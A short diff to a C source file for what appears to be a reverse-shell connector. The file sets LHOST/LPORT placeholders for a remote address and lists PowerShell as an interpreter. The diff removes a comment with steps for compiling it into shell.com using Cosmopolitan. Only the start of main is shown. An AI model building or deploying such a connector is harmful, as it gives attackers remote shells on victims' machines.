@@ -18,15 +18,6 @@
 #define REMOTE_ADDR "§LHOST§"
 #define REMOTE_PORT "§LPORT§"
 
-/*
- * build instructions:
- * git clone --depth 1 https://github.com/jart/cosmopolitan.git
- * cp ./reverse/connector/cosmopolitan.c ./cosmopolitan/examples/shell.c
- * cd ./cosmopolitan/
- * make -j$(nproc) -O MODE=tiny
- * ls ./o/tiny/examples/shell.com
- */
-
 int main(int argc, char *argv[], char *envp[]) {
     char* interpreters[] = {
         "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
